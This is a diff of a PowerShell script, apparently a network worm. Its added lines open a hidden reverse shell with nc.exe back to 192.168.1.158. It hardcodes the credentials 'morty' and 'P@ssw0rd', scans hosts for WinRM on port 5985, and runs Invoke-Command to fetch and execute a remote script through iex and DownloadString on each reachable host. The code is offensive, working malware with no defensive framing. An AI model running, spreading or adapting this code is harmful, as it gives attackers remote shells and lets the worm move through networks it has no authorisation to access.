@@ -16,7 +16,7 @@ $b++
 if ($an -eq $true){
 
 Start-Sleep -Seconds 20
-Start-Process powershell '-w hidden $env:temp\nc.exe 192.168.1.158 $p -e cmd.exe'
+Start-Process -WindowStyle Hidden powershell.exe "-nop $env:TEMP\nc.exe 192.168.1.158 $p -e cmd.exe"
 
 }
 
@@ -24,10 +24,8 @@ Start-Process powershell '-w hidden $env:temp\nc.exe 192.168.1.158 $p -e cmd.exe
 
 
 
-# -------------worm------------------------------
 
-
-$u = $morty
+$u = "morty"
 $p = "P@ssw0rd"
 
 $atk = "192.168.1.158"
@@ -61,30 +59,19 @@ $result = $TCPObject.ConnectAsync($currentip, '5985').Wait(50)
 
 if ($result -eq $true){
 
-$islive = Test-WSMan machine-1 -Credential morty -Authentication Negotiate -ErrorAction SilentlyContinue
+$islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotiate -ErrorAction SilentlyContinue
 
 if ($islive -ne $null){
 
-Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock {iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1')}
 
-
-
-}
-
-}
+Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock { Start-Process -WindowStyle Hidden "-nop iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1')" }
 
 
 }
 
+}
 
 
-
-#------------end of scanner
-
-
-
-
-
-
+}
 
 
